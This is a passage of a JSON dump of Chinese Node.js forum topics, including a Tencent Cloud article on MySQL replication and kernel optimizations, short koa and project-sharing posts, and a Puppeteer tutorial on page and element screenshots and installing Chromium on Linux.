5.5版本开始默认引擎才是InnoDB事务型）、存在多个分支、读写效率瓶颈等问题。</p>\n<p>所以如何用好MYSQL变得至关重要，一方面需要通过MYSQL优化找出系统读写瓶颈，提高数据库性能；另一方面需要合理涉及数据结构、调整参数，以提高用户操作响应；同时还有尽可能节省系统资源，以便系统可以提供更大负荷的服务。本文将为大家介绍腾讯云团队是如何对Mysql进行内核级优化的思路和经验。</p>\n<p>早期的CDB主要基于开源的Oracle MySQL分支，侧重于优化运维和运营的OSS系统。在腾讯云，因为用户数的不断增加，对CDB for MySQL提出越来越高的要求，腾讯云CDB团队针对用户的需求和业界发展的技术趋势，对CDB for MySQL分支进行深度的定制优化。优化重点围绕内核性能、内核功能和外围OSS系统三个维度展开，具体的做法如下：</p>\n<h2>一.内核性能的优化</h2>\n<p>由于腾讯云上的DB基本都需要跨园区灾备的特性，因此CDB for MySQL的优化主要针对主从DB部署在跨园区网络拓扑的前提下，重点去解决真实部署环境下的性能难题。经过分析和调研，我们将优化的思路归纳为：“消除冗余I/O、缩短I/O路径和避免大锁竞争”。以下是内核性能的部分案例：</p>\n<h3>1.主备DB间的复制优化</h3>\n<p><img src=\"https://mc.qcloudimg.com/static/img/8c8db0efe355f7560ab0d8bd3b292a2f/image.jpg\" alt=\"img\"></p>\n<h4>问题分析</h4>\n<p>如上图所示，在原生MySQL的复制架构中，Master侧通过Dump线程不断发送Binlog事件给Slave的I/O线程，Slave的I/O线程在接受到Binlog事件后，有两个主要的动作：</p>\n<ul>\n<li>写入到Relay Log中，这个过程会和Slave SQL线程争抢保护Relay Log的锁。</li>\n<li>更新复制元数据(包含Master的位置等信息)。</li>\n</ul>\n<h4>优化方法</h4>\n<p>经过分析，我们的优化策略是：</p>\n<ul>\n<li>Slave I/O线程和Slave SQL线程是典型的单写单读生产者-消费者模型，是可以做到无锁设计的；因此实现思路就是Slave I/O线程在每次写完数据后，原子更新Relay Log的长度信息，Slave SQL线程读取Relay Log的时以长度信息为边界。这样就将原本竞争激烈的Relay Log锁化解为无锁；</li>\n<li>由于Binlog事件中的GTID(Global Transaction Identifier)和DB事务是一一对应的关系，所以Relay Log中的数据本身已经包含了所需要的复制元数据，所以我们可以不写Master info文件，消除了冗余的文件I/O；</li>\n<li>于DB都是以事务为更新粒度的，因为在Relay Log文件I/O上，我们通过合并离散小I/O为事务粒度的大I/O等手段，使磁盘I/O得以大幅提升。</li>\n</ul>\n<h4>优化效果</h4>\n<p><img src=\"https://mc.qcloudimg.com/static/img/61ecc999dce8d5c64dd330d7de34c942/image.jpg\" alt=\"img\"></p>\n<p>如上图所示，经过优化：左图35.79%的锁竞争(futex)已经被完全消除；同压测压力下，56.15%的文件I/O开销被优化到19.16%，Slave I/O线程被优化为预期的I/O密集型线程。</p>\n<h4>2.主库事务线程和Dump线程间的优化</h4>\n<p><img src=\"https://mc.qcloudimg.com/static/img/ad4a92ae82417a4ab6ea3d3b5bf64677/image.png\" alt=\"img\"></p>\n<h4>问题分析</h4>\n<p>如上图所示，在原生MySQL中多个事务提交线程TrxN和多个Dump线程之间会同时竞争Binlog文件资源的保护锁，多个事务提交线程对Binlog执行写入，多个Dump线程从Binlog文件读取数据并发送给Slave。所有的线程之间是串行执行的！</p>\n<p><strong>优化方法</strong></p>\n<p>经过分析，我们的优化策略是：</p>\n<ul>\n<li>将读写分离开来，多个写入的线程还是在锁保护下串行执行，每一个写入线程写入完成后更新当前Binlog的长度信息，多个Dump线程以Binlog文件的长度信息为读取边界，多个Dump线程之间并行执行。以这种方式来让复制拓扑中的Dump线程发送得更快！</li>\n</ul>\n<p><strong>效果</strong></p>\n<p><img src=\"https://ask.qcloudimg.com/raw/sn6zbmyvgr.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>经过测试，优化后的内核，不仅提升了事务提交线程的性能，在Dump线程较多的情况下，对主从复制性能有较大提升。</p>\n<h2>二.主备库交互流程优化</h2>\n<p><img src=\"https://mc.qcloudimg.com/static/img/a35b51d6685dc781d68d61604bcdf74a/image.png\" alt=\"img\"></p>\n<h4>问题分析</h4>\n<p>如上图所示，在原生MySQL中主备库之间的数据发送和ACK回应是简单的串行执行，在上一个事件ACK回应到达之前，不允许继续发送下一个事件；这个行为在跨园区(RTT 2-3ms)的情况性能非常差，而且也不能很好地利用带宽优势。</p>\n<h4>优化方法</h4>\n<p>经过分析，我们的优化策略是：</p>\n<ul>\n<li>将发送和ACK回应的接收独立到不同的线程中，由于发送和接收都是基于TCP流的传输，所以时序性是有保障的；这样发送线程可以在未收ACK之前继续发送，接受线程收到ACK后唤醒等待的线程执行相应的任务。</li>\n</ul>\n<h4>效果</h4>\n<p>根据实际用例测试，优化后的TPS提升为15%左右。</p>\n<h2>三.内核功能的优化</h2>\n<h4>1. 预留运维帐号连接数配额</h4>\n<p>在腾讯云上，不时遇到用户APP异常或者BUG从而占满DB的最大连接限制，这是CDB OSS帐号无法登录以进行紧急的运维操作。针对这个现状，我们在MySQL内核单独开辟了一个可配置的连接数配额，即便在上述场景下，运维帐号仍然可以连接到DB进行紧急的运维操作。极大地降低了异常情况下DB无政府状态的风险。该帐号仅有数据库运维管理权限，无法获取用户数据，也保证了用户数据的安全性。</p>\n<h4>2. 主备强同步</h4>\n<p>针对一些应用对数据的一致性要求非常高，CDB在MySQL原生半同步的基础上进行了深度优化，确保一个事务在主库上提交之前一定已经复制到至少一个备库上。确保主库宕机时数据的一致性。</p>\n<h2>四.外围系统的优化</h2>\n<p>除了以上提到的MySQL内核侧的部分优化，我们也在外围OSS平台进行了多处优化。例如使用异步MySQL ping协议实现大量实例的监控、通过分布式技术来加固原有系统的HA/服务发现和自动扩容等功能、在数据安全/故障切换和快速恢复方面也进行了多处优化。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"举个栗子看如何做MySQL 内核深度优化","last_reply_at":"2018-12-25T04:12:54.862Z","good":false,"top":false,"reply_count":1,"visit_count":451,"create_at":"2018-12-25T03:33:43.564Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c18bd5f7ec239239ff58177","author_id":"58bcce197872ea0864fee3d5","tab":"ask","content":"<div class=\"markdown-text\"><p>就是想登录之后有个本地变量可以保存user信息，然后在一个新的页面展示出来，是用cookie吗？还是用ctx.state，但是不清楚怎么用这个对象？\n例如：</p>\n<pre class=\"prettyprint\"><code>let data = await user.addUser(username, password);\n  let userData = data.get({ plain: true });\n  delete userData.password;\n  ctx.redirect(&#x27;&#x2F;&#x27;);\n</code></pre><pre class=\"prettyprint\"><code>async function index(ctx) {\nawait ctx.render(&#x27;index&#x27;, {\n  username: ctx.state.user.username\n});\n}\nallRouter.get(&#x27;&#x2F;&#x27;, index);\n</code></pre><p>怎么样获取到user里面的username?</p>\n</div>","title":"怎么使用koa框架里面的ctx.state？","last_reply_at":"2018-12-25T01:53:21.703Z","good":false,"top":false,"reply_count":3,"visit_count":921,"create_at":"2018-12-18T09:26:55.728Z","author":{"loginname":"dreamsline","avatar_url":"https://avatars3.githubusercontent.com/u/20219371?v=4&s=120"}},{"id":"5c1cc73976c4964062a1c5cd","author_id":"5a3075929807389a1809f330","tab":"share","content":"<div class=\"markdown-text\"><p>[预览效果][<a href=\"https://unnue.com/music\">https://unnue.com/music</a>]\n<a href=\"https://github.com/jigsaw-china/unnue-nuxt\">Github地址</a></p>\n<ul>\n<li>基于vuejs、vuex</li>\n<li>歌曲接口基于 QQ音乐API，可以查看 [QQ音乐播放地址 API][<a href=\"https://unnue.com/article/46\">https://unnue.com/article/46</a>]</li>\n</ul>\n<p><img src=\"//static.cnodejs.org/FvPHIUPcdyf772eGR2KhMR7Io5Uf\" alt=\"QQ图片20181221185305.png\"></p>\n</div>","title":"vue 实现音乐模块🏄，已添加到github，动起来","last_reply_at":"2018-12-24T12:00:17.628Z","good":false,"top":false,"reply_count":3,"visit_count":794,"create_at":"2018-12-21T10:58:01.869Z","author":{"loginname":"varscc","avatar_url":"https://avatars3.githubusercontent.com/u/32264346?v=4&s=120"}},{"id":"51d8a18cd44cbfa304c6d44c","author_id":"51d7f8e6d44cbfa304bb5f50","content":"<div class=\"markdown-text\"><p>node是好。但是主机很难找。不知道有没有专门空间</p>\n</div>","title":"node.js 有没有廉价的主机","last_reply_at":"2018-12-24T08:00:23.172Z","good":false,"top":false,"reply_count":23,"visit_count":4994,"create_at":"2013-07-06T23:00:28.276Z","author":{"loginname":"gentlecolder","avatar_url":"//gravatar.com/avatar/b33dfb4a2308474b4a9d19dcb42c0a10?size=48"}},{"id":"5c206b5d76c4964062a1cfe3","author_id":"56ef6b9ffa2ee8df3a6503e2","tab":"share","content":"<div class=\"markdown-text\"><p>github <a href=\"https://github.com/amorist/icon-generator\">https://github.com/amorist/icon-generator</a></p>\n<p><img src=\"https://img.hacpai.com/e/254133fcdac341b580dfb708632299b8.png\" alt=\"image\"></p>\n<p><img src=\"https://user-images.githubusercontent.com/14037268/50332636-b5a2cc80-053d-11e9-8c22-2e2f4fb899ba.png\" alt=\"image\"></p>\n<p><img src=\"https://user-images.githubusercontent.com/14037268/50329524-9f434380-0532-11e9-8e71-c1fedb78ed58.png\" alt=\"image\"></p>\n</div>","title":"想生成个 win 和 mac 的 App 图标，找到个软件，解锁功能要 68 生气自己写了个","last_reply_at":"2018-12-24T06:44:55.239Z","good":false,"top":false,"reply_count":1,"visit_count":610,"create_at":"2018-12-24T05:15:09.152Z","author":{"loginname":"amor520","avatar_url":"https://avatars0.githubusercontent.com/u/14037268?v=4&s=120"}},{"id":"5c1c8ed276c4964062a1c358","author_id":"595dc9f2d1d54a0a0890b4ec","tab":"ask","content":"<div class=\"markdown-text\"><p>各位，请教一个问题：\n如果服务端有两个借助Koa搭建的服务，比如服务A和服务B，服务A中有些数据自己暂时用不到，但是服务B需要使用，这个时候服务B中怎么更好的获取到这些数据呢？</p>\n</div>","title":"求教多个koa服务进程间如何更好的通信呢？","last_reply_at":"2018-12-24T02:52:49.306Z","good":false,"top":false,"reply_count":17,"visit_count":801,"create_at":"2018-12-21T06:57:22.297Z","author":{"loginname":"xwwscu","avatar_url":"https://avatars1.githubusercontent.com/u/8022267?v=4&s=120"}},{"id":"5c20406776c4964062a1ce29","author_id":"5c203a3376c4964062a1cdd3","tab":"share","content":"<div class=\"markdown-text\"><h1>JsonOnRelations</h1>\n<p>Json-On-Relations 可以帮助你快速搭建企业级应用。它负责连接UI和后端的关系型数据库。现有的ORM过度关注“对象”，而忽略数据本质上的关系属性，导致它们只能被应用于简单的“增删改查”应用。企业级应用中，每个实体需要几十张数据表表达， 而且实体本身的表结构以及表与表之间的关系都需适应业务的变化而调整。更何况业务实体与实体之间存在着错综复杂的关系。处理这些复杂实体的操作并不只局限在“增删改查”这四种操作上。 针对以上， Json-On-Relations从有别于现有ORM的思路出发，提供了一种新的框架，帮助更有效率的开发企业级应用。</p>\n<p>详情请查阅：<a href=\"https://github.com/VinceZK/json-on-relations\">Github: Json-On-Relation</a>, 以及<a href=\"https://www.npmjs.com/package/json-on-relations\">NPM: Json-On-Relation</a></p>\n</div>","title":"Json-On-Relations: 快速搭建企业级应用","last_reply_at":"2018-12-24T02:11:51.492Z","good":false,"top":false,"reply_count":0,"visit_count":424,"create_at":"2018-12-24T02:11:51.492Z","author":{"loginname":"VinceZK","avatar_url":"https://avatars3.githubusercontent.com/u/4759678?v=4&s=120"}},{"id":"5bbc96f8ede204052db8043f","author_id":"59a0d92f4e3c4e5a7021b45c","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://www.yuque.com/dtwave_nodejs/blog\">小伙伴们的语雀频道</a></p>\n<h2>一、<code>Puppeteer</code>介绍及安装</h2>\n<blockquote>\n<p><code>Puppeteer</code>是一个<code>Node</code>库，它提供了一个高级API来通过DevTools协议控制<code>Chromium</code>。\n在谷歌推出这款<code>headless</code>浏览器后，<code>Selenium</code>直接被我抛弃了，因为<code>Puppeteer</code>对于<code>Nodejs</code>开发者来说简直太友好了，（正常情况下）只需要<code>npm i puppeteer</code>，即可完成安装，而不需要安装其他的依赖库（<em>当初太年轻o(╥﹏╥)o，其实并不简单</em>）。</p>\n</blockquote>\n<p>系统环境的话在工作时使用MacOS，部署到服务器上的是Centos 7.\n在<code>MacOS</code>上确实简单，只需要<code>npm i puppeteer</code>就行。安装不了有下列几条解决办法：</p>\n<pre class=\"prettyprint language-shell\"><code># 1. 设置环境变量跳过下载 Chromium（2018-09-03已失效）\nset PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=1\n\n# 2. 只下载模块而不build，但chromium需要自行下载（2018-09-03有效）\nnpm i --save puppeteer --ignore-scripts\n\n# 3. Puppeteer从v1.7.0开始额外提供一个puppeteer-core的库，它只包含Puppeteer的核心库，默认不下载chromium\nnpm i puppeteer-core\n\n# 如果连puppeteer都安装不了，建议使用淘宝镜像\nnpm config set registry=&quot;https:&#x2F;&#x2F;registry.npm.taobao.org&quot;\n</code></pre><p>如果<code>Chromium</code>是自行下载的，则启动<code>headless</code>浏览器时需增加如下配置项</p>\n<pre class=\"prettyprint language-js\"><code>this.browser = await puppeteer.launch({\n  &#x2F;&#x2F; MacOS应该在&quot;xxx&#x2F;Chromium.app&#x2F;Contents&#x2F;MacOS&#x2F;Chromium&quot;，Linux应该&quot;&#x2F;usr&#x2F;bin&#x2F;chromium-browser&quot;\n  executablePath: &quot;Chromium的安装路径&quot;,\n  &#x2F;&#x2F; 去沙盒\n  args: [&#x27;--no-sandbox&#x27;, &#x27;--disable-dev-shm-usage&#x27;],\n});\n</code></pre><blockquote>\n<p><a href=\"https://download-chromium.appspot.com/\">Chromium下载，Linux下需要安装其他依赖</a><br>\n<a href=\"https://juejin.im/post/5a506682f265da3e474435d9\">点击了解Puppeteer的用例</a></p>\n</blockquote>\n<h2>二、技巧</h2>\n<h3>懒加载截图</h3>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/3120794-53585db786e8806e.gif?imageMogr2/auto-orient/strip\" alt=\"滚动截图.gif\"></p>\n<blockquote>\n<p>在截图或者爬虫时，常常遇到一些页面采用懒加载的方式展示数据，首屏是不会展示全部的信息给我们。\n针对懒加载，采用滚动到底的方式来破解。\n啥？懒加载没有底，尝试直接调他们的接口吧，或者还有其他高明的方式欢迎指出</p>\n</blockquote>\n<p><a href=\"https://zhaoqize.github.io/puppeteer-api-zh_CN/#/class-Page?id=pageevaluatepagefunction-args\">page.evaluate(pageFunction, …args)</a>: 该函数能让我们使用内置的DOM选择器</p>\n<p>这里要特别注意下<code>pageFunction</code>的\b传参方式为：</p>\n<pre class=\"prettyprint language-js\"><code>const result = await page.evaluate(param1, param2, param3 =&gt; {\n  return Promise.resolve(8 + param1 + param2 + param3);\n}, param1, param2, param3);\n\n&#x2F;&#x2F; 也可以传一个字符串：\nconsole.log(await page.evaluate(&#x27;1 + 2&#x27;)); &#x2F;&#x2F; 输出 &quot;3&quot;\nconst x = 10;\nconsole.log(await page.evaluate(&#96;1 + ${x}&#96;)); &#x2F;&#x2F; 输出 &quot;11&quot;\n</code></pre><p><strong>代码：以简书的懒加载为例</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;**\n * 懒加载页面自动滚动 \n *&#x2F;\nconst path = require(&#x27;path&#x27;);\nconst puppeteer = require(&#x27;puppeteer-core&#x27;);\n\nconst log = console.log;\n(async () =&gt; {\n  const browser = await puppeteer.launch({\n    &#x2F;&#x2F; executablePath: path.join(__dirname, &#x27;.&#x2F;chromium&#x2F;Chromium.app&#x2F;Contents&#x2F;MacOS&#x2F;Chromium&#x27;),\n    &#x2F;&#x2F; 关闭headless模式, 会打开浏览器\n    headless: false,\n    args: [&#x27;--no-sandbox&#x27;, &#x27;--disable-dev-shm-usage&#x27;],\n  });\n  const page = await browser.newPage();\n  await page.goto(&#x27;https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;40909ea33e50&#x27;);\n  await autoScroll(page);\n\n  &#x2F;&#x2F; fullPage截图\n  await page.screenshot({\n    path: &#x27;auto_scroll.png&#x27;,\n    type: &#x27;png&#x27;,\n    fullPage: true,\n  });\n  await browser.close();\n})();\n\nasync function autoScroll(page) {\n  log(&#x27;[AutoScroll begin]&#x27;);\n  await page.evaluate(async () =&gt; {\n    await new Promise((resolve, reject) =&gt; {\n      &#x2F;&#x2F; 页面的当前高度\n      let totalHeight = 0;\n      &#x2F;&#x2F; 每次向下滚动的距离\n      let distance = 100;\n      &#x2F;&#x2F; 通过setInterval循环执行\n      let timer = setInterval(() =&gt; {\n        let scrollHeight = document.body.scrollHeight;\n\n        &#x2F;&#x2F; 执行滚动操作\n        window.scrollBy(0, distance);\n\n        &#x2F;&#x2F; 如果滚动的距离大于当前元素高度则停止执行\n        totalHeight += distance;\n        if (totalHeight &gt;= scrollHeight) {\n          clearInterval(timer);\n          resolve();\n        }\n      }, 100);\n    });\n  });\n\n  log(&#x27;[AutoScroll done]&#x27;);\n  &#x2F;&#x2F; 完成懒加载后可以完整截图或者爬取数据等操作\n  &#x2F;&#x2F; do what you like ...\n}\n</code></pre><h3>元素精确截图</h3>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/3120794-96ed578c80c740c0.gif?imageMogr2/auto-orient/strip\" alt=\"精确截图.gif\"></p>\n<blockquote>\n<p>精确截图，顾名思义是将元素在页面上所占据的区域<code>抠</code>下来。 那么换成<code>Puppeteer</code>的方式来处理，是利用<code>screenshot</code>的<code>clip</code>参数，根据元素相对视窗的坐标（<code>x、y</code>）及元素的款\b宽高（<code>width、height</code>）定位截图。当然了，元素选择器必须要\b找准，否则再怎么样也无法精确截图</p>\n</blockquote>\n<ul>\n<li><a href=\"https://zhaoqize.github.io/puppeteer-api-zh_CN/#/class-Page?id=pagescreenshotoptions\">page.screenshot参数 clip</a></li>\n<li><code>element.getBoundingClientRect()</code>: 通过这个方法可以获取到元素在视窗内的相对位置（返回对象中包括 <code>left、top、width、height</code>），相关知识点可谷歌了解下</li>\n<li><code>$eval</code>: 此方法在页面内执行 <code>document.querySelector</code> ，然后把匹配到的元素作为第一个参数传给 <code>pageFunction</code></li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>const path = require(&#x27;path&#x27;);\nconst puppeteer = require(&#x27;puppeteer-core&#x27;);\n\nconst log = console.log;\n(async () =&gt; {\n  const browser = await puppeteer.launch({\n    &#x2F;&#x2F; executablePath: path.join(__dirname, &#x27;.&#x2F;chromium&#x2F;Chromium.app&#x2F;Contents&#x2F;MacOS&#x2F;Chromium&#x27;),\n    &#x2F;&#x2F; 关闭headless模式, 会打开浏览器\n    headless: false,\n    args: [&#x27;--no-sandbox&#x27;, &#x27;--disable-dev-shm-usage&#x27;],\n  });\n  const page = await browser.newPage();\n  await page.goto(&#x27;https:&#x2F;&#x2F;www.jianshu.com&#x2F;&#x27;);\n  const pos = await getElementBounding(page, &#x27;.board&#x27;);\n\n  &#x2F;&#x2F; clip截图\n  await page.screenshot({\n    path: &#x27;element_bounding.png&#x27;,\n    type: &#x27;png&#x27;,\n    clip: {\n      x: pos.left,\n      y: pos.top,\n      width: pos.width,\n      height: pos.height\n    }\n  });\n  await browser.close();\n})();\n\nasync function getElementBounding(page, element) {\n  log(&#x27;[GetElementBounding]: &#x27;, element);\n\n  const pos = await page.$eval(element, e =&gt; {\n    &#x2F;&#x2F; 相当于在evaluate的pageFunction内执行\n    &#x2F;&#x2F; document.querySelector(element).getBoundingClientRect()\n    const {left, top, width, height} = e.getBoundingClientRect();\n    return {left, top, width, height};\n  });\n  log(&#x27;[Element position]: &#x27;, JSON.stringify(pos, undefined, 2));\n  return pos;\n}\n</code></pre><p>OK，目前为止我们能可以对大部分的元素截图了，其余的是处于内滚动的元素</p>\n<h3>内滚动元素截图</h3>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/3120794-6a7c6e75a87813d1.gif?imageMogr2/auto-orient/strip\" alt=\"内滚动截图.gif\"></p>\n<blockquote>\n<p>内滚动：相对于传统的window窗体滚动\b，它的主滚动条是在页面（或者某个元素）的内部，而不是在浏览器窗体上。最常见的是在后台管理界面，左侧栏和右侧的内容区的滚动条是分开的。</p>\n</blockquote>\n<p>想象一下，打开网易云音乐，首屏会出现两个内滚动条，如果我们想看到更多的歌单，需要将滚动条下滑。\n内滚动截图也是同样的道理，结合页面滚动让目标元素暴露在可视范围内，再通过视窗坐标来达到精确截图。</p>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/3120794-814120a09521e4df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"网易云音乐内滚动条.png\"></p>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/3120794-a40f7daaaf5f2d54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"内滚动元素坐标示例.png\"></p>\n<p><strong>步骤：</strong></p>\n<ol>\n<li>获取目标元素的坐标，判断其是否在当前可视范围内，如果在视窗内，则无需滚动</li>\n<li>由于是内滚动，目标元素外面必定套了一层有滚动条的父元素，通过滚动该父元素来间接展示目标元素。所以这一步需要确定父元素的选择器</li>\n<li>通过模拟页面滚动父元素（设置 <code>window.scrollBy</code> 或者 <code>scrollLeft scrollTop</code>），使目标对象刚好能完整地出现在视窗内</li>\n<li>因为是内滚动，所以需要重新获取目标元素的坐标（<code>getBoundingClientRect</code>）</li>\n<li>利用新坐标截图</li>\n</ol>\n<p>这儿有个小细节，关于如何判断元素是否有滚动条。如果元素无<code>X轴</code>滚动条，那么设置他的<code>scrollLeft</code>是没有效果的，这时只能全局滚动才行。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 如果scrollWidth值大于clientWidth值，则可以说明其出现了横向滚动条\nelement.scrollHeight &gt; element.clientHeight\n\n&#x2F;&#x2F; 如果scrollHeight值大于clientHeight值，则可以说明其出现了竖向滚动条\nelement.scrollHeight &gt; element.clientHeight\n</code></pre><p><strong>示例代码：以<a href=\"https://nodejs.org/dist/latest-v10.x/docs/api/\">Nodejs官方文档</a>中的内滚动为例，获取左侧栏中TTY的截图</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;**\n * 截取左侧栏中TTY所在的li节点\n *&#x2F;\nconst path = require(&#x27;path&#x27;);\nconst puppeteer = require(&#x27;puppeteer-core&#x27;);\n\nconst log = console.log;\n(async () =&gt; {\n  const browser = await puppeteer.launch({\n    executablePath: path.join(__dirname, &#x27;.&#x2F;chromium&#x2F;Chromium.app&#x2F;Contents&#x2F;MacOS&#x2F;Chromium&#x27;),\n    &#x2F;&#x2F; 关闭headless模式, 会打开浏览器\n    headless: false,\n    args: [&#x27;--no-sandbox&#x27;, &#x27;--disable-dev-shm-usage&#x27;],\n  });\n  const page = await browser.newPage();\n  await page.setViewport({width: 1920, height: 600});\n  const viewport = page.viewport();\n\n  &#x2F;&#x2F; Nodejs官方Api文档站\n  await page.goto(&#x27;https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;latest-v10.x&#x2F;docs&#x2F;api&#x2F;&#x27;);\n\n  &#x2F;&#x2F; await page.waitFor(1000);\n  &#x2F;&#x2F; 这里强烈建议使用 waitForNavigation，1000这中魔鬼数字会让代码变得不放心\n  await page.waitForNavigation({\n      &#x2F;&#x2F; 20秒超时时间\n      timeout: 20000,\n      &#x2F;&#x2F; 不再有网络连接时判定页面跳转完成\n      waitUntil: [\n        &#x27;domcontentloaded&#x27;,\n        &#x27;networkidle0&#x27;,\n      ],\n    });\n\n  &#x2F;&#x2F; step1: 确定内滚动的父元素选择器\n  const containerEle = &#x27;#column2&#x27;;\n  &#x2F;&#x2F; step1: 确定目标元素选择器\n  const targetEle = &#x27;#column2 ul:nth-of-type(2) li:nth-of-type(40)&#x27;;\n\n  &#x2F;&#x2F; step1: 获取目标元素在当前视窗内的坐标\n  let pos = await getElementBounding(page, targetEle);\n\n  &#x2F;&#x2F; 使用内置的DOM选择器\n  const ret = await page.evaluate(async (viewport, pos, element) =&gt; {\n\n    &#x2F;&#x2F; step1: 判断目标元素是否在当前可视范围内\n    const sumX = pos.width + pos.left;\n    const sumY = pos.height + pos.top;\n\n    &#x2F;&#x2F; X轴和Y轴各需要移动的距离\n    const x = sumX &lt;= viewport.width ? 0 : sumX - viewport.width;\n    const y = sumY &lt;= viewport.height ? 0 : sumY - viewport.height;\n\n    const el = document.querySelector(element);\n\n    &#x2F;&#x2F; strp3: 将元素滚动进视窗可视范围内\n    &#x2F;&#x2F; 此处需要判断目标元素的x、y是否可滚动，如果元素不能滚动则滚动window\n    &#x2F;&#x2F; 如果scrollWidth值大于clientWidth值，则可以说明其出现了横向滚动条\n    if (el.scrollWidth &gt; el.clientWidth) {\n      el.scrollLeft += x;\n    } else {\n      window.scrollBy(x, 0);\n    }\n    &#x2F;&#x2F; 如果scrollHeight值大于clientHeight值，则可以说明其出现了竖向滚动条\n    if (el.scrollHeight &gt; el.clientHeight) {\n      el.scrollTop += y;\n    } else {\n      window.scrollBy(0, y);\n    }\n\n    return [el.scrollHeight, el.clientHeight];\n  }, viewport, pos, containerEle);\n\n  &#x2F;&#x2F; step4: 由于目标元素在视窗外，且处于内滚动父元素内，所以需要重新获取坐标\n  pos = await getElementBounding(page, targetEle);\n  \n  &#x2F;&#x2F; await page.waitFor(1000);\n  &#x2F;&#x2F; 这里强烈建议使用 waitForNavigation，1000这中魔鬼数字会让代码变得不放心\n  await page.waitForNavigation({\n      &#x2F;&#x2F; 20秒超时时间\n      timeout: 20000,\n      &#x2F;&#x2F; 不再有网络连接时判定页面跳转完成\n      waitUntil: [\n        &#x27;domcontentloaded&#x27;,\n        &#x27;networkidle0&#x27;,\n      ],\n    });\n\n  &#x2F;&#x2F; 5. 截图\n  await page.screenshot({\n    path: &#x27;scroll_and_bounding.png&#x27;,\n    type: &#x27;png&#x27;,\n    clip: {\n      x: pos.left,\n      y: pos.top,\n      width: pos.width,\n      height: pos.height\n    }\n  });\n  await browser.close();\n})();\n</code></pre><h2>三、踩过的坑：在 <code>Linux</code> 上安装 <code>Chromium</code></h2>\n<blockquote>\n<p>事实证明：在Linux环境中安装Chromium的经历会无比难忘。\n安装<code>puppeteer</code>时，会自动下载Chromium，由于众所周知的原因，下载常常以失败告终。换个镜像源后Chromium能下载成功，但启动后\n各种报错，是Linux上缺少部分依赖导致的。安装完需要的依赖，代码顺利运行。但截图却发现浏览器上的中文字体竟全是框框框框。OK，安装字体库，中文字正常显示了！</p>\n</blockquote>\n<p><strong>踩坑后的最佳实践</strong></p>\n<ul>\n<li>采用<code>Chromium</code>和<code>npm包</code>分开的方式，只安装<code>puppeteer-core</code>，通过<code>executablePath</code>引入自行下载的<code>Chromium</code>，极大加快<code>npm install</code> 的速度。</li>\n<li>将Linux的镜像源切换成阿里的镜像源，可以快速下载<code>Chromium</code></li>\n<li>将项目改用<code>Docker</code>部署，避免出现本地开发正常，上线后却出现各种问题的情况</li>\n<li>尽量避免使用<code>page.waifFor(1000)</code>，1000\b\b毫秒数只是毛估估的时间，让程序自己决定效果会更好</li>\n</ul>\n<p><strong>相关解决办法：</strong></p>\n<ul>\n<li>\n<p><a href=\"https://github.com/GoogleChrome/puppeteer/blob/master/docs/troubleshooting.md\">官方整理的错误集锦</a></p>\n</li>\n<li>\n<p><a href=\"https://github.com/GoogleChrome/puppeteer/issues/391\">Centos安装依赖库</a></p>\n</li>\n</ul>\n<pre class=\"prettyprint language-shell\"><code>yum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 ipa-gothic-fonts xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi xorg-x11-utils xorg-x11-fonts-cyrillic xorg-x11-fonts-Type1 xorg-x11-fonts-misc -y\n</code></pre><ul>\n<li><a href=\"https://github.com/GoogleChrome/puppeteer/issues/379\">Alpine安装技巧</a></li>\n</ul>\n<pre class=\"prettyprint language-shell\"><code># 设置阿里镜像源\necho &quot;https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;alpine&#x2F;edge&#x2F;main&quot; &gt; &#x2F;etc&#x2F;apk&#x2F;repositories\necho &quot;https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;alpine&#x2F;edge&#x2F;community&quot; &gt;&gt; &#x2F;etc&#x2F;apk&#x2F;repositories\necho &quot;https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;alpine&#x2F;edge&#x2F;testing&quot; &gt;&gt; &#x2F;etc&#x2F;apk&#x2F;repositories\n\n# 安装Chromium及依赖，包括中文字体支持\napk -U --no-cache update\napk -U --no-cache --allow-untrusted add zlib-dev xorg-server dbus ttf-freefont chromium wqy-zenhei@edge -f\n</code></pre><p>安装完后需要去沙箱才能运行，尽管官方并不推荐。</p>\n<blockquote>\n<p>Linux沙箱：在计算机安全领域，沙箱(Sandbox)是一种程序的隔离运行机制，其目的是限制不可信进程的权限。沙箱技术经常被用于执行未经测试的或不可信的客户程序。为了避免不可信程序可能破坏其它程序的运行。</p>\n</blockquote>\n<ul>\n<li><code>--no-sandbox</code>: 去沙箱运行</li>\n<li><code>--disable-dev-shm-usage</code>: 默认情况下，<code>Docker</code>运行一个<code>/dev/shm</code>共享内存空间为64MB 的容器。这通常对Chrome来说太小，并且会导致Chrome在渲染大页面时崩溃。要修复，必须运行容器 <code>docker run --shm-size=1gb</code> 以增加<code>/dev/shm</code>的容量。从Chrome 65开始，使用<code>--disable-dev-shm-usage</code>标志启动浏览器即可，这将会写入共享内存文件<code>/tmp</code>而不是<code>/dev/shm</code>.</li>\n</ul>\n<pre 